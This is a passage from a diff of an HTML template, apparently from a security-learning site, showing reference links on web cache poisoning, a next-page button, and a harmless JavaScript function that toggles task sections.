+            <li><a href="https://portswigger.net/web-security/web-cache-poisoning">PortSwigger - Web Cache Poisoning</a></li>
+            <li><a href="https://owasp.org/www-community/attacks/Web_Cache_Poisoning">OWASP - Web Cache Poisoning</a></li>
+            <li><a href="https://www.acunetix.com/blog/web-security-zone/cache-poisoning-vulnerabilities/">Acunetix - Cache Poisoning Vulnerabilities</a></li>
+        </ul>
+    </div>
+</div>          
+<div class="next-page">
+  <a href="/learning" class="next-button">Proceed to Next Page: Beginner hacker</a>
+</div>                           
+            <script>
+                function toggleTask(taskId) {
+            const tasks = document.querySelectorAll('.task-content');
+            const icons = document.querySelectorAll('.task-title i');
+        
+            tasks.forEach(task => {
+                if (task.parentElement.id === taskId) {
+                    if (task.style.display === 'none' || task.style.display === '') {
+                        task.style.display = 'block';
+                        task.previousElementSibling.classList.add('open');
+                    } else {
+                        task.style.display = 'none';
+                        task.previousElementSibling.classList.remove('open');
+                    }
+                } else {
+                    task.style.display = 'none';
+                    task.previousElementSibling.classList.remove('open');
+                }
+            });
+        }
+        
+            </script>
+        </body>
+        
+        
+        {% endblock %}</div>
+    
